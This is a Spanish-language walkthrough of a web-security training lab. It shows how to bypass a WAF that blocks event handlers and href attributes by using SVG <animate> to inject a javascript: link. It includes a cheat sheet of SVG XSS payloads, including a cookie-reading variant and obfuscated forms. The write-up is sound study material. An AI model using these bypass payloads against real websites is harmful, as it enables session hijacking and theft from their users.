# Lab: Reflected XSS with event handlers and href attributes blocked


This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the `alert` function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

```html
<a href="">Click me</a>
```
---


Como se trata de un contexto HTML entre etiquetas, sabemos que el parámetro de búsqueda refleja el payload que se le inyecte:
![image](https://github.com/user-attachments/assets/6d1bb63e-6238-4146-b8b0-6707ef8d6611)

Tembién sabemos que tenemos un waf que bloquea la mayoría de las etiquetas:
![image](https://github.com/user-attachments/assets/d34ec8c0-b27e-4ab5-8fb0-203c84c0e680)

Por lo que dice el ejercicio, el waf tiene una lista blanca de etiquetas, entre las cuales, está permitida al etiqueta `<a>`:
![image](https://github.com/user-attachments/assets/f274c733-f853-4e80-b3f3-0bb47a9f0cec)

Sin embargo si queremos inyectar la siguiente etiqueta:
```html
<a href="javascript:alert(1)">Click me</a>
```
Vemos que el atributo `href` está bloqueado:
![image](https://github.com/user-attachments/assets/9887dbca-5f68-4839-9f95-cfb9a2fc68f9)

Procedemos a realizar un Sniper Attack con Burpsuite Intruder para averiguar las tags permitidas:
![image](https://github.com/user-attachments/assets/851d9069-0f80-4489-8130-653c29d5a86a)

Hay que tener especial atención al `<svg>`, ya que:

- Es comúnmente usado en ataques XSS modernos.

- Se puede usar junto con eventos como `onload`, por ejemplo:
  ```html
  <svg onload="alert(1)">
  ```
Probamos el payload pero vemos que el atributo onload es bloqueado:
![image](https://github.com/user-attachments/assets/776bb23a-6f73-4202-9568-c9593f3dd206)


---

# 🧠 Guía Completa de XSS usando `<svg>`

## 🧩 ¿Por qué `<svg>` es útil para XSS?

`<svg>` es una etiqueta válida de HTML5 usada para gráficos vectoriales.  
Lo interesante es que el navegador la permite aunque el WAF (Firewall) bloquee etiquetas clásicas como `<script>`, `<img>`, etc.

Además, **dentro de un `<svg>` podés insertar eventos de JavaScript**, como `onload`, `onmouseover`, etc., lo que la hace una excelente herramienta para bypass.

---

## 🧪 Casos básicos de XSS con `<svg>`

### 1. 🧨 Payload mínimo funcional:

```html
<svg onload=alert(1)>
```

- `onload`: se ejecuta apenas el navegador carga el SVG.

---

### 2. 🔥 Payload dentro de una URL (reflected XSS):

```url
?search=<svg%20onload=alert(1)>
```

- `%20` es espacio, el navegador lo decodifica al mostrarlo.

---

### 3. 🛠️ Payload más elaborado con atributos adicionales:

```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
```

- `xmlns`: hace que el SVG sea completamente válido.
- `document.domain`: otra forma de probar que se ejecuta JS.

---

## 💡 ¿Qué eventos podés usar?

- `onload` ✅ → apenas se carga.
- `onmouseover` ✅ → cuando pasás el mouse.
- `onfocus` ✅ → cuando hacés foco (útil con `tabindex`).
- `onclick` ✅ → cuando hacés click.

```html
<svg onclick=alert(1)>Click me</svg>
```

---

## 🎯 Casos reales de bypass con `<svg>`

### ✅ Bypass cuando `<script>` está bloqueado:

```html
<svg/onload=alert(1)>
```

### ✅ Payload sin paréntesis:

```html
<svg onload=confirm`${document.cookie}`>
```

### ✅ Payload ofuscado:

```html
<svg %0Aonload=alert(1)>
```

---

## 💡 Pro Tips

| Caso | Técnica |
|------|---------|
| WAF bloquea `<script>` | Usá `<svg onload=...>` |
| WAF bloquea paréntesis | Usá template strings: \`${...}\` |
| WAF bloquea `"`, `'` | Usá backticks o sin comillas |
| Quieren que se dispare solo | `onload` o `autofocus + #hash` |

---

## 🧪 Práctica rápida

```url
?search=<svg%20onload=alert(document.domain)>
```

```url
?search=<svg%20id=x%20onfocus=alert(1)%20tabindex=1>#x
```

---

## 🧱 Si tenés un WAF muy fuerte...

```html
<svg><script>alert(1)</script></svg>
```

```html
<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
```

> Ojo: no todos los navegadores modernos permiten `javascript:` dentro de SVGs hoy.

---




## 📦 Payload SVG final

Nosotros sabemos que con `<svg>` podemos insertar etiquetas como la `<a>`. El ejercicio debe contener un texto que diga `Click me` pero no podemos poner lo siguiente:
```html
<svg><a>Click me</a></svg>
```
Como sabemos, para insertar texto dentro de un `<svg>`, necesitamos utilizar la etiqueta `<text>`:
```html
<svg><a><text x=20 y=20>Click me</text></a></svg>
```
![image](https://github.com/user-attachments/assets/c5c3ba04-4afb-4b6b-9854-3907f0f20fcc)

Como sabemos que necesitamos brindar un link con la URL vulnerable para que el usuario haga clic, lo más natural sería usar una etiqueta `<a>` con el atributo `href`. Sin embargo, en este caso, el atributo `href` está restringido o filtrado, por lo que necesitamos otra forma de insertar un enlace.

Para lograrlo, utilizamos la etiqueta `<animate>`, que forma parte de `<SVG>`. Esta etiqueta permite animar atributos de un elemento `SVG` a lo largo del tiempo.

En otras palabras, `<animate>` nos permite insertar un atributo de forma indirecta, como si lo estuviéramos "configurando dinámicamente", lo cual es útil para bypass de filtros.

# 🎨 Uso de `<animate>` para modificar atributos dinámicamente en SVG

## 🧪 Ejemplo simple con `animate` que modifica un atributo (`fill`)

```html
<svg width="200" height="100">
  <rect x="10" y="10" width="180" height="80" fill="blue">
    <animate attributeName="fill" from="blue" to="red" dur="2s" begin="0s" fill="freeze" />
  </rect>
</svg>
```

## 🔍 ¿Qué hace este código?

- Se dibuja un rectángulo azul (`fill="blue"`).
- Dentro del `<rect>`, agregamos una etiqueta `<animate>`.
- `attributeName="fill"` indica qué atributo se quiere animar.
- `from="blue"` a `to="red"` indica que va a pasar de azul a rojo.
- `dur="2s"` significa que la transición dura 2 segundos.
- `begin="0s"` empieza automáticamente.
- `fill="freeze"` mantiene el color final (rojo).

---

## 💡 ¿Cuál es el flujo?

1. El SVG se renderiza con un `<rect>` azul.
2. El navegador lee la etiqueta `<animate>` dentro del `<rect>`.
3. Detecta que debe modificar el atributo `fill` de `blue` a `red`.
4. Comienza la transición automáticamente (`begin="0s"`).
5. En 2 segundos, el rectángulo termina siendo rojo.
6. **El atributo `fill` fue modificado dinámicamente en el DOM**, ¡gracias a `<animate>`!





```html
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(1) />
    <text x=20 y=20>Click me</text>
  </a>
</svg>
```

---
# Conclusión

## 🔍 Explicación Paso a Paso

### 1. `<svg>`

- Contenedor SVG (Scalable Vector Graphics) donde se puede incluir código gráfico, pero también etiquetas como `<a>`, `<text>`, y `<animate>`.

### 2. `<a>`

- Representa un enlace.
- Su atributo `href` se puede modificar dinámicamente (aunque en este ejercicio no se upede utilizar).

### 3. `<animate>`

- Permite modificar atributos con animaciones.
- Aquí, se usa para modificar el `href` del enlace a `javascript:alert(1)`.

```html
<animate attributeName=href values=javascript:alert(1) />
```

- **`attributeName=href`**: especifica que se animará el atributo `href`.
- **`values=javascript:alert(1)`**: el valor que tomará el atributo.

### 4. `<text>`

- Muestra el texto `"Click me"` en la pantalla.
- Coordenadas `x=20` y `y=20` posicionan el texto dentro del SVG.

```html
<text x=20 y=20>Click me</text>
```

### Resultado:

- Cuando el usuario hace clic en el texto "Click me", se ejecuta `javascript:alert(1)`.

---

## ⚠️ Consideraciones de Seguridad

- Aunque atributos peligrosos como `onload` o `href` se filtren, se pueden establecer indirectamente con `<animate>`.
- Este método puede eludir muchos filtros WAFs y validadores mal implementados.

---

## 📚 Recursos Adicionales

- [XSS fun with animated SVG - ISEC](https://blog.isec.pl/xss-fun-with-animated-svg/)
- [SVG animate XSS vector - PortSwigger Research](https://portswigger.net/research/svg-animate-xss-vector)

Inyectamos el payload y resolvemos el lab:
![image](https://github.com/user-attachments/assets/1f46abab-64e0-42b4-8b9b-c3c9d4f13cc8)

## 🛠️ ¿Qué pasa cuando el navegador procesa eso?

1. El navegador interpreta el SVG.
2. El elemento `<animate>` le **inyecta dinámicamente** el atributo `href="javascript:alert(1)"` al `<a>` en el **DOM**.  
3. Ese `href` no fue visible para el WAF, pero ya existe en el **DOM**, lo más probable es que el WAF esté validando el HTML, pero no valide las modificaciones del **DOM** en tiempo de ejecución, entonces `href` permanece oculto para el WAF.
4. Cuando la víctima hace clic → se **ejecuta el JavaScript** (`alert(1)`).






